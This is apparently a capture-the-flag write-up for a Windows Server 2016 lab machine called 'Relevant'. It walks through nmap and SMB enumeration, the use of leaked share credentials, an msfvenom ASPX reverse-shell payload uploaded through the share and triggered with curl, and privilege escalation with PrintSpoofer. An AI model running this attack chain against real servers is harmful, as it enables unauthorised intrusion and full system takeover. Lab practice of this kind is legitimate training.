# Relevant

## Scanning & Enumeration

```bash
nmap -p- -T4 -A IP
```

Output:

```bash
# Nmap 7.91 scan initiated Wed Nov 18 22:35:20 2020 as: nmap -p80,135,139,445,3389,48663,49666,49668 -A -T4 -oN nmap.txt relevant
Nmap scan report for relevant (10.10.140.237)
Host is up (0.12s latency).

PORT      STATE    SERVICE            VERSION
80/tcp    open     http               Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open     msrpc              Microsoft Windows RPC
139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds       Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open     ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2020-11-18T22:36:45+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2020-07-24T23:16:08
|_Not valid after:  2021-01-23T23:16:08
|_ssl-date: 2020-11-18T22:37:25+00:00; 0s from scanner time.
48663/tcp filtered unknown
49666/tcp open     msrpc              Microsoft Windows RPC
49668/tcp open     msrpc              Microsoft Windows RPC

Running (JUST GUESSING): Microsoft Windows 2016|2012 (90%)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

#### Port 135/445 SMB

We first enumerate the SMB service with smbclient

```bash
smbclient -L 10.10.140.237
smbclient \\\\10.10.140.237\\nt4wrksv
```

We find a share named **nt4wrksv** and it contains a file **passwords.txt**

Using **psexec.py**

```bash
psexec.py bob:'!P@$$W0rD!123'@10.10.140.237
psexec.py bill:'Juw4nnaM4n420696969!$$$'@10.10.140.237
```

We figure out that while bob is a valid user (with prob wrong creds)
bill is not.
We cannot log in so we move on.

#### Port 80/49663

Doing a gobuster or both ports gives as an interesting finding

```bash
gobuster dir -u http://10.10.140.237 -w /usr/share/wordlists/dirbyster/directory-list-2.3-medium.txt
gobuster dir -u http://10.10.140.237:49663 -w /usr/share/wordlists/dirbyster/directory-list-2.3-medium.txt
```

We find **/nt4wrksv** on port 49663

If we navigate throught the directory we can see the passwords.txt file
This means that we can access files from the web that have been uploaded in
the smb share

## Exploitation

We gathered enought info to start testing some payloads

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f aspx -o exploit.aspx
```

In the smb share now

```bash
put exploit.aspx
```

Do a curl command to trigger the payload

```bash
curl http://10.10.140.237/nt4wrksv/exploit.aspx
```

And boom we got a shell

## Post Exploitation

Searching throught the machine.
Uploading winPEAS.exe
Uploading pspy
Din't help me

Reading throught my notes. I decided to try looking the privileges of the
user

```bash
whoami /priv
```

Output:

```text
SeImpersonatePrivilege  Impersonate a client after authentication   Enabled
```

This is vulnerable!!!

## Privilege Escalation

Trying the Potato attack or incognito got me nowhere but not loosing hope
I found the **Printspoofer** exploit

Uploading and Running it, got me root

```bash
PrintSpoofer.exe -i -c cmd
```

```json
```
